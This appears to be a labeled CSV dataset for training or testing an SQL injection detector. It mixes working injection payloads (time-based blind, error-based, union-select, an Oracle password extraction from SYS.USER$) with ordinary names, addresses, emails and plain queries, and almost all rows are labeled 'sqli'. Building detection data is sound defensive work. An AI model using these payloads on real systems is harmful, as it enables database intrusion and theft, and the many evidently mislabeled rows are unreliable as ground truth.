query,label
0o380ado6,sqli
"1""   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  ""whld""  =  ""whld",sqli
"SELECT * FROM dig WHERE kept BETWEEN ""stick"" AND    ""youth""",sqli
nurit,sqli
"ondulada, 121",sqli
22200,sqli
"select dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  70  )  ||chr  (  106  )  ||chr  (  78  )  ,5  )   from dual--",sqli
44494,sqli
48549953n,sqli
"1""  )   where 8196  =  8196",sqli
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3-- ampw",sqli
walborn@19horas.cat,sqli
1  )   as bpap where 7758  =  7758 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,sqli
"calle el pilar s/n,",sqli
SELECT * FROM grandfather WHERE beneath NOT BETWEEN 'began' AND 'ants',sqli
vingelli9@custombikesclothes.fr,sqli
"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null#",sqli
"   SELECT managed,afternoon,particularly,primitive,stop     (  (  who JOIN follow ON length.sum =  variety.ocean )   INNER JOIN cryON Orders.cake =  cry.goldenID ) ",sqli
"-9881""   )    )    or 9850  =  8118#",sqli
SELECT * FROM farther WHERE that = 'gradually' LIMIT 3,sqli
"  UPDATE explore SET section =  'lot', City =  'forgot' WHERE equator =  eaten",sqli
cassasola nochez,sqli
1'+  (  select qydm where 6019  =  6019,sqli
"   SELECT Employees.shown, COUNT ( Orders.massageID )  AS soapFROM    ( OrdersINNER JOIN work ON Orders.biggerID  =  Employees.tieID ) ",sqli
c/ arco de veronicas s/n 4e,sqli
1   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,sqli
1133130000000000,sqli
marella,sqli
1' rlike sleep  (  5  )  #,sqli
"1%"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",sqli
8759,sqli
balcom,sqli
conde,sqli
1'+  (  select 'rajp' where 3300  =  3300,sqli
"  UPDATE daughter SET doubt =  'door', City =  'told' WHERE factor =  outline",sqli
57317186j,sqli
" SELECT * FROM serious ORDER BY wrote ASC, spin DESC",sqli
"1""   )    )    as qhnb where 8302  =  8302 and   (  3020  =  3020  )  *6703--",sqli
"-9553""  )   as geih where 6453  =  6453 or 8453  =  8159--",sqli
9.19E+015,sqli
SELECT * FROM  ( SELECT compare FROM private ) ,sqli
"1'+  (  select tnch where 1867  =  1867 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   +'",sqli
"1 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  -- fwzl",sqli
" SELECT * FROM outside ORDER BY move, pink",sqli
"  SELECT eggID AS ID, sitting AS him FROM throw",sqli
59973244p,sqli
"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",sqli
boes@cumbareback.kz,sqli
1' where 5778  =  5778,sqli
"1""   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and ""lxfm""  =  ""lxfm",sqli
SELECT * FROM everything FETCH FIRST 50 PERCENT ROWS ONLY,sqli
SELECT * FROM news WHERE gently NOT LIKE '[paper]%',sqli
SELECT * FROM reach WHERE happen = 'design'  AND City = 'signal',sqli
SELECT MIN ( deep )  AS visitor FROM early,sqli
" select * from users where id  =  1 union select 1<@,version  (    )   -- 1",sqli
"1""  )   where 8098  =  8098",sqli
admin' or ',sqli
"  UPDATE receive SET face =  'nodded', City =  'cup' WHERE by =  pony",sqli
"1""  )   rlike   (  select   (  case when   (  5746  =  5367  )   then 1 else 0x28 end   )    )    and   (  ""hnnf"" like ""hnnf",sqli
" select * from users where id  =  1 or ""?["" or 1  =  1 -- 1",sqli
SELECT COUNT(*) FROM orders WHERE status='inactive',benign
SELECT AVG ( wood ) FROM term SELECT SUM ( smile ) ,sqli
nadina,sqli
SELECT * FROM plus WHERE several NOT LIKE 'mother%',sqli
18440,sqli
1' in boolean mode  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  #,sqli
"select * from generate_series  (  9709,9709,case when   (  9709  =  7795  )   then 1 else 0 end  )   limit 1--",sqli
"1""  )   as ranl where 5553  =  5553",sqli
SELECT * FROM clear WHERE pig IN  ( SELECT discovery FROM north ) ,sqli
"1'  )   where 8255  =  8255 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sqli
select case when 8514  =  3207 then 1 else null end--,sqli
chao-pin2,sqli
SELECT TOP 50 PERCENT * FROM college SELECT * FROM memory FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM rising,sqli
"1""  )   where 1001  =  1001 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",sqli
SELECT * FROM reader FETCH FIRST 50 PERCENT ROWS ONLY,sqli
"  SELECT Orders.strugglerID, Employees.brief, Employees.favorite FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.leafID ORDER BY Orders.grabbedID",sqli
9600,sqli
arcos de jaln,sqli
cornisamen!to,sqli
10300,sqli
"-3541"" or make_set  (  9354  =  9354,7185  )   and ""fgxu""  =  ""fgxu",sqli
SELECT * FROM parent FETCH FIRST 50 PERCENT ROWS ONLY,sqli
SELECT COUNT ( DISTINCT fuel )  FROM history,sqli
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 299801 )  ORDER BY meta_id ASC",sqli
SELECT * FROM friendly WHERE possibly = 'interest' FETCH FIRST 3 ROWS ONLY,sqli
"INSERT INTO harbor  ( worth, bone, married )  VALUES  ( 'basic', 'negative', 'spell' )  ",sqli
5773290000000000,sqli
SELECT * FROM bottom WHERE fully BETWEEN '1996-07-01' AND '1996-07-31',sqli
"""a"""" or 1  =  1--""",sqli
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,sqli
SELECT * FROM machine WHERE control BETWEEN '1996-07-01' AND '1996-07-31',sqli
-8963  )   where 8528  =  8528 or   (  2470  =  3271  )  *3271--,sqli
30736152x,sqli
SELECT TOP 3 * FROM gain,sqli
FROM  ( SELECT DISTINCT owner FROM ball ) ,sqli
"1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'wgpg' like 'wgpg",sqli
SELECT price FROM products WHERE sku='SKU9900',benign
orea,sqli
SELECT * FROM customs WHERE beat BETWEEN '1996-07-01' AND '1996-07-31',sqli
"   SELECT Employees.white, COUNT ( Orders.beforeID )  AS lakeFROM    ( OrdersINNER JOIN herd ON Orders.whistleID  =  Employees.climbID ) ",sqli
SELECT steady ( s )  FROM felt LEFT JOIN,sqli
"1%' union all select null,null,null,null--",sqli
 or 2 > 1,sqli
" select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",sqli
ecija 51 12-h,sqli
vahid,sqli
SELECT flag FROM directly UNION ALL SELECT combination FROM swim ORDER BY triangle,sqli
"1"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""rdri""  =  ""rdri",sqli
av. del mar cantabrico 176 6-d,sqli
1'   )    )    and 6690  =  3250#,sqli
flis@14horas.gt,sqli
SELECT * FROM large WHERE own BETWEEN '1996-07-01' AND '1996-07-31',sqli
"1   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",sqli
"-7996""   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""iuzv"" like ""iuzv",sqli
log9era,sqli
SELECT AVG ( lying ) FROM be,sqli
1'  )   as ftyp where 5851  =  5851 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,sqli
" SELECT DISTINCT column1 , column2, ... FROM table_name ;",sqli
SELECT * FROM  ( SELECT under FROM reason ) ,sqli
-5313'   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'wkkp' like 'wkkp,sqli
wolbert.navin@cirugiaalbeiteria.nu,sqli
urea bernat,sqli
SELECT * FROM slave,sqli
"passatge badal, 31,",sqli
"1"" and elt  (  4249  =  4249,7259  )  ",sqli
1'  )   as chla where 6098  =  6098,sqli
"1%' and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",sqli
SELECT TOP 3 * FROM gravity WHERE men = 'her',sqli
SELECT COUNT ( son ) FROM remarkable,sqli
mortensen@look2fly.nr,sqli
"   SELECT steady,happened,wait,mathematics,affect     (  (  spent JOIN thirty ON gravity.hidden =  sitting.magic )   INNER JOIN caveON Orders.all =  detail.anybodyID ) ",sqli
7770,sqli
1'||  (  select 'bifa' where 6077  =  6077 and 4547  =  9301,sqli
SELECT * FROM car WHERE naturally = 'plane' LIMIT 3,sqli
15807509t,sqli
"1%"" and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """,sqli
"1"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and ""vnei"" like ""vnei",sqli
SELECT nuts ( s ) FROM else INNER JOIN,sqli
soulef,sqli
FROM  ( SELECT DISTINCT return FROM call ) ,sqli
SELECT * FROM energy WHERE twelve NOT BETWEEN 'printed' AND 'accept',sqli
18995930t,sqli
"1"" or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",sqli
1 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   -- jduw,sqli
"   SELECT COUNT ( especially ) , crew FROM soldier BY height",sqli
SELECT * FROM  ( SELECT prove FROM individual ) ,sqli
5106,sqli
"1'  )   as knxr where 5662  =  5662 union all select null,null,null,null,null,null,null,null#",sqli
33825,sqli
mamakos@palodegolf.com.rw,sqli
aguacella,sqli
cusell vinageras,sqli
4.19037E+015,sqli
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_status_3139' LIMIT 1,sqli
"   SELECT COUNT ( forget ) , appearance FROM say BY flame",sqli
"1""   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""adwg"" like ""adwg",sqli
"   SELECT careful, aware, reasonFROM plane WHERE flag  IS NOT NULL",sqli
"  SELECT * FROM boat WHERE equipment NOT IN  ( 'calm', 'blue', 'except' )  ",sqli
"   SELECT Employees.carbon, COUNT ( Orders.viewID )  AS dugFROM    ( OrdersINNER JOIN constantly ON Orders.islandID  =  Employees.blockID ) ",sqli
SELECT * FROM ranch WHERE instead = 'gas'  OR travel = 'variety',sqli
6051280000000000,sqli
DELETE FROM mood,sqli
1   )    )    as ipfy where 1189  =  1189,sqli
40984940k,sqli
buschoff_fortuna@rudos.zr,sqli
"  SELECT islandID AS ID, skin AS because FROM thousand",sqli
"c/ corint, 13 11?a",sqli
1   )    )    and sleep  (  5  )   and    (    (   9084  =  9084,sqli
c356conio,sqli
"SELECT column1 , column2 , ... FROM table_name WHERE condition ; CREATE OR REPLACE VIEW [Brazil Customers] AS ",sqli
onzonilla,sqli
"-9451%""  )   union all select 9963,9963,9963--",sqli
SELECT option_value FROM wp_options WHERE option_name  =  'can_compress_scripts' LIMIT 1,sqli
SELECT option_value FROM wp_options WHERE option_name  =  'options_footer_button_3_text' LIMIT 1,sqli
" SELECT * FROM species ORDER BY steel, drop",sqli
paley,sqli
"1',  (  select   (  case when   (  5217  =  5217  )   then 1 else 5217*  (  select 5217 from mysql.db  )   end   )    )   ",sqli
"chorrito bajo, 11",sqli
" and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,116   )    )   <>char  (  39,39   )    )   ,1,0   )    )   ;",sqli
clooney,sqli
or 1 in   (  select @@version  )  --,sqli
65,sqli
SELECT AVG ( Price ) FROM attack,sqli
SELECT * FROM sessions WHERE id=88,benign
SELECT MIN ( plan )  AS doctor FROM touch,sqli
"  SELECT * FROM empty WHERE afraid IN  ( 'appearance', 'track', 'purpose' )  ",sqli
"1'   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  'wesl'  =  'wesl",sqli
39500,sqli
saturnino,sqli
coe,sqli
"1%'   )    )    union all select null,null,null,null#",sqli
"1'||  (  select 'ryom' where 1134  =  1134 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",sqli
SELECT AVG ( Price ) FROM drink,sqli
SELECT * FROM flame WHERE progress = 'push'  AND  ( turn = 'perfect' OR bound = 'seven' ) ,sqli
-7950'  )   or 9323  =  9323#,sqli
SELECT COUNT ( stateID ) FROM account,sqli
SELECT * FROM seat WHERE fill NOT BETWEEN 'sound' AND 'winter',sqli
pelland,sqli
levi@coivoco.gr,sqli
said,sqli
laurencia,sqli
SELECT column_name ( s )  FROM table1 UNION ALL,sqli
siu-kwok,sqli
benzo,sqli
7519310000000000,sqli
"1'  )   where 7279  =  7279 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",sqli
6991,sqli
claudiano,sqli
"1'   )    )    as ijyi where 3694  =  3694   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",sqli
1' where 2547  =  2547 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,sqli
"-1236'+  (  select 'fbgh' where 3896  =  3896 union all select 3896,3896,3896,3896,3896,3896,3896,3896,3896--",sqli
sols galcera,sqli
sikes-jeans@923.mv,sqli
"1'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  'zcey'  =  'zcey",sqli
1  )   where 8433  =  8433 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,sqli
caada del hoyo,sqli
hanlon@importaproductosespaoles.cs,sqli
"1  )   where 9645  =  9645 union all select null,null,null--",sqli
"1""   )    )    rlike sleep  (  5  )   and    (    (   ""fzlr""  =  ""fzlr",sqli
"1%""   )    )     )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",sqli
27002424x,sqli
SELECT COUNT ( damageID ) FROM foreign,sqli
5220000000000000,sqli
"1"" union all select null#",sqli
descrieres@enibiza.com.ac,sqli
"1%'   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",sqli
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5#",sqli
SELECT shot ( s )  FROM height SELECT noun FROM zero,sqli
"1'  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  ",sqli
1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  6824  =  6824,sqli
"   SELECT wear,stone,whom,sat,first     (  (  higher JOIN ice ON sound.aware =  difference.halfway )   INNER JOIN callON Orders.force =  structure.taxID ) ",sqli
kokosopo,sqli
"  SELECT * FROM hang WHERE fifteen NOT IN  ( 'three', 'speech', 'furniture' )  ",sqli
"1'||  (  select 'jpso' from dual where 9357  =  9357 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   ||'",sqli
"-4285'   )    )     )   union all select 8819,8819,8819,8819,8819,8819,8819,8819#",sqli
SELECT TOP 3 * FROM page WHERE chest = 'author',sqli
SELECT south ( s )  FROM just UNION ALL,sqli
"INSERT INTO chicken ( belt, bad, guess, perhaps, girl, part )  VALUES  ( 'feature', 'hidden'. surprise', 'shown', 'wind', 'minute', 'bet' )  ",sqli
"1%'   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  '%'  =  '",sqli
SELECT * FROM molecular WHERE    NOT put = 'nest',sqli
"   SELECT you,dance,welcome,leg,children     (  (  ball JOIN ahead ON account.birth =  driving.visit )   INNER JOIN disappearON Orders.sick =  eight.purposeID ) ",sqli
"   SELECT writing, tea, heldFROM forest WHERE swung  IS NOT NULL",sqli
"1%'   )    )    union all select null,null,null#",sqli
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",sqli
1'||  (  select 'ocmk' from dual where 3961  =  3961 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  ||',sqli
SELECT * FROM hello WHERE first NOT BETWEEN 'sleep' AND 'breathing',sqli
" union   (  select NULL, NULL,   (  select @@version   )    )    --",sqli
SELECT * FROM clock WHERE Price NOT BETWEEN 10 AND 20,sqli
66,sqli
SELECT * FROM planned FETCH FIRST 3 ROWS ONLY,sqli
SELECT diameter ( s )  FROM pictured FULL OUTER JOIN,sqli
SELECT excitement ( s )  FROM lamp FULL OUTER JOIN,sqli
36384,sqli
SELECT * FROM dried  WHERE worse = or,sqli
"1%""   )    )    or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",sqli
"-3933%""   )    )    or elt  (  8142  =  2978,2978  )   and    (    (   ""%""  =  """,sqli
SELECT her ( s )  FROM fox UNION ALL,sqli
1'  )   where 2120  =  2120,sqli
SELECT * FROM water ORDER BY service,sqli
netty9,sqli
SELECT tobacco FROM newspaper UNION ALL SELECT numeral FROM stared ORDER BY substance,sqli
